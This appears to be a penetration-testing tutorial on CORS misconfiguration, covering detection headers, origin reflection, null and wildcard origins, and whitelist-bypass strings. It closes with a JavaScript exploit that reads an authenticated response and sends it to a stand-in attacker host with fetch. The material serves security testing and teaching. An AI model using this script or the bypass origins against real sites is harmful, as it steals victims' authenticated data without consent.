# Cross-Origin Resource Sharing (CORS) Misconfiguration

Cross-Origin Resource Sharing (CORS) is a browser security mechanism that allows a web application running at one origin to access resources from another origin.

A **CORS misconfiguration** occurs when a server incorrectly allows untrusted origins to access sensitive resources.

If the configuration is insecure, attackers may be able to **read responses from authenticated requests made by a victim's browser**.

### Impact

A CORS misconfiguration may allow attackers to:

- Read authenticated API responses
- Access sensitive user data
- Retrieve account information
- Expose internal API endpoints
- Perform cross-origin data exfiltration

### Conditions for Exploitation

A CORS vulnerability is typically exploitable when the response contains:

```
Access-Control-Allow-Origin: attacker-controlled-origin
Access-Control-Allow-Credentials: true
```

Both conditions must be present for sensitive authenticated data to be exposed.

---

## Detection

CORS vulnerabilities can be identified by examining HTTP response headers.

Important CORS headers include:

```
Access-Control-Allow-Origin
Access-Control-Allow-Credentials
Access-Control-Allow-Headers
Access-Control-Expose-Headers
```

### Testing for CORS

Send a request to the target endpoint with a custom `Origin` header.

Example request header:

```
Origin: https://evil.com
```

If the server reflects the origin:

```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

the endpoint may be vulnerable.

---

## CORS with Basic Origin Reflection

The server reflects the `Origin` header directly in the response.

Example request:

```
Origin: https://evil.com
```

Example response:

```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

This allows an attacker-controlled website to read authenticated responses.

---

## CORS with Trusted Null Origin

Some applications incorrectly trust the special origin value:

```
Origin: null
```

This origin may occur in contexts such as:

- sandboxed iframes
- local files
- data URLs

Example vulnerable response:

```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

Attackers can exploit this using sandboxed iframe environments.

---

## CORS with Wildcard Origin

Some servers allow all origins.

Example configuration:

```
Access-Control-Allow-Origin: *
```

This allows any domain to access the resource.

Browsers block credentialed requests when wildcard origins are used with credentials, but sensitive public data may still be exposed.

---

## CORS with Whitelist Bypass

Some applications allow only trusted domains.

Example configuration:

```
Access-Control-Allow-Origin: https://trusted-site.com
```

Weak validation may allow attackers to bypass the restriction.

### Subdomain Bypass

```
https://trusted-site.com.evil.com
```

### Credential Injection

```
https://trusted-site.com@evil.com
```

### URL Fragment Trick

```
https://evil.com#trusted-site.com
```

### Encoding Tricks

URL encoding may confuse origin validation logic.

---

# Exploitation Example

If the server reflects attacker-controlled origins and allows credentials, an attacker can steal sensitive responses.

Example attack script:

```
<script>
var req = new XMLHttpRequest();
req.open('GET','https://target.com/sensitive-endpoint',true);
req.withCredentials = true;
req.onload = function() {
    fetch('https://attacker.com/log?data='+this.responseText);
};
req.send();
</script>
```

When a victim visits the attacker’s website, the browser sends an authenticated request to the target server and the response is exfiltrated.